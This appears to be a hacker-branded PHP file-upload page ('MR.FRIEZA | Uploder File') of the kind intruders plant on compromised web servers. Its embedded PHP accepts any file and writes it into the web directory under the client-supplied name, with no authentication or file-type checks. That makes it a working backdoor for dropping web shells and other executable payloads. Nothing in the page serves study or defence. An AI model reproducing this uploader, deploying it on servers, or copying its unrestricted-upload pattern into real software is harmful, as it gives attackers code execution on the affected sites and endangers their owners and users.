<head>
<style>
<!--
p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}-->
</style>
</head>

<title>|&quot;MR.FRIEZA&quot;| Uploder File</title>
<body bgcolor="#000000">

<p align="center"><b><font size="6" color="#CC9900">MR.FRIEZA</font><font color="#B76C35" size="6"> 
| </font><font size="6" color="#FFFFFF">Uploder File</font></b></p>
<p align="center">&nbsp;</p>

<table style="BORDER-COLLAPSE: collapse" cellspacing="0" bordercolordark="#666666" cellpadding="5" height="1" width="100%" bgcolor="#000000" bordercolorlight="#c0c0c0" border="1">
	<tr>
		<a bookmark="minipanel" style="font-weight: normal; color: #009900; font-family: verdana; text-decoration: none">
		<td width="50%" height="1" valign="top" style="font-family: verdana; color: #d9d9d9; font-size: 11px">
		<center>Upload<form method="POST" enctype="multipart/form-data">
			<input type="hidden" name="act" value="upload" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900">
			<input type="file" name="userfile" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900" size="31"><input type="hidden" name="miniform" value="1" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900">
			<input type="submit" name="submit" value="Upload" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900"><br><br>
			<?php
$uploaddir = "";
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);

if (isset($_FILES['userfile']['name'])) {
        if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
                echo "The file ". basename($_FILES['userfile']['name']) ." has been uploaded";
        } else {
                echo "There was an error uploading the file. please try again!";
        }
}
?>
		</form>
		</center></td>
	</tr>
</table>
</a>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center"><b><font color="#FFFFFF" size="5">
<font color="#00FF00" face="Tahoma">contact us<span lang="ar-sa"> </span>:</font><font color="#6A6A6A" face="Tahoma">
</font></font><font size="5" color="#CC9900" face="Tahoma">ax2@</font><font color="#FFFFFF" size="5"><span lang="ar-sa"><font color="#CC9900" face="Tahoma">HoTmaiL.</font></span><font color="#CC9900" face="Tahoma">no</font></font></b></p>
